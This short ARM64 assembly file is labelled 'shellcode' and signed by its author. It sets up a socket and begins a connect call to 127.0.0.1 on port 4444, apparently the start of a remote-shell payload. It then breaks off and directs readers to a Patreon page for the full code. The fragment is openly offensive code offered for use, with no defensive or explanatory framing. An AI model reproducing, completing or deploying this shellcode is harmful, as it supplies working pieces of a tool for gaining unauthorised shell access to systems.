;//////////Codigo por Belial Grimoire////////////
;/////bgpavelang.github.io//////
;/////shellcode//////
;//////////////////////////////////////////////

.arch armv8-a

.global _start


.text

_start:

mov x8, 198
mov x2, 0
mov x1, 1
mov x0, 2
svc 0

mov w3, w0

mov x8, 203
mov x2, 16

movz x1, 0x2
movk x1, 0x5c11, lsl 16
movk x1, 0x007f, lsl 32
movk x1, 0x0001, lsl 48

Código completo en...
Code complete on...
https://www.patreon.com/BGPavelAng
Ayudame a seguir haciendo más de esto.
